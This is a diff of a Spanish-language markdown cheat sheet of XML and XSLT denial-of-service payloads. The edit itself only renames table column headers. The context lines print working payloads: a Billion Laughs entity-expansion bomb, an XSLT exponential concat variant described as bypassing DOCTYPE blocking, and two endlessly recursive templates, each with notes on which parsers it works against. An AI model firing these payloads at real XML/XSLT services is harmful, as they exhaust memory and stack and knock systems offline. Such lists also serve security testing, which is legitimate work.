@@ -25,7 +25,7 @@ linked:
 
 ## Billion Laughs / Expansión Exponencial
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Billion Laughs clásico | `<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">...]>` | Si parser permite DTDs y no tiene entity expansion limit. |
 | Billion Laughs XSLT estilo | `<xsl:variable name="a" select="'A'"/><xsl:variable name="b" select="concat($a,$a,$a,$a,$a,$a,$a,$a,$a,$a)"/><xsl:variable name="c" select="concat($b,$b,$b,$b,$b,$b,$b,$b,$b,$b)"/>...` | Cadena recursiva sin DTDs — funciona aunque DOCTYPE bloqueado. |
@@ -63,7 +63,7 @@ ___
 
 ## Recursión Infinita / Loops
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Template autorrecursivo | `<xsl:template name="loop"><xsl:call-template name="loop"/></xsl:template><xsl:template match="/"><xsl:call-template name="loop"/></xsl:template>` | Sin caso base — pila explota. |
 | Recursión con param | `<xsl:template name="r"><xsl:param name="i"/><xsl:call-template name="r"><xsl:with-param name="i" select="$i + 1"/></xsl:call-template></xsl:template>` | Stack overflow en motores sin tail-call. |
